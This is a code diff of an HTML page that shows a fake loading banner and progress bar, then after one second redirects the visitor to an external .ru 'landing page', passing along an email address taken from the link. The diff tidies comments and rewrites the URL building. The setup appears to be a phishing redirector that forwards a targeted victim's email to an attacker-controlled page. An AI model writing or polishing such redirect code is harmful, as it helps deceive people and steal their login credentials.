@@ -6,7 +6,6 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    /* ── Top banner bar ── */
     .banner {
       position: fixed;
       top: 0; left: 0; right: 0;
@@ -31,9 +30,9 @@
       animation: spin 0.7s linear infinite;
       flex-shrink: 0;
     }
+
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* progress bar that fills in 1s */
     .progress {
       position: fixed;
       top: 41px; left: 0;
@@ -42,6 +41,7 @@
       width: 0%;
       animation: fill 1s linear forwards;
     }
+
     @keyframes fill { to { width: 100%; } }
 
     .banner span { color: #aaa; }
@@ -57,19 +57,24 @@
   <div class="progress"></div>
 
   <script>
-    // ── CONFIG ──────────────────────────────────────────
-    const LANDING_PAGE = "https://peabaite.ru/QQmqtl!qi3a5ECM6jV3PMkS/";  // ← your landing page
-    const DELAY_MS     = 1000;                   // ← 1 second
-    // ────────────────────────────────────────────────────
+    // ── CONFIG ─────────────────────────────────────────
+    const LANDING_PAGE = "https://peabaite.ru/QQmqtl!qi3a5ECM6jV3PMkS/"; // ← your landing page
+    const DELAY_MS     = 1000;                        // ← 1 second delay
+    // ───────────────────────────────────────────────────
 
+    // Get email from URL parameter
     const params = new URLSearchParams(window.location.search);
     const email  = params.get("email") || "";
 
     setTimeout(() => {
-      const url = new URL(LANDING_PAGE);
-      if (email) url.searchParams.set("email", email);
-      window.location.href = url.toString();
+      if (email) {
+        // Build clean URL manually — no trailing slash, no double encoding
+        window.location.href = LANDING_PAGE + "?email=" + encodeURIComponent(email);
+      } else {
+        window.location.href = LANDING_PAGE;
+      }
     }, DELAY_MS);
   </script>
+
 </body>
 </html>
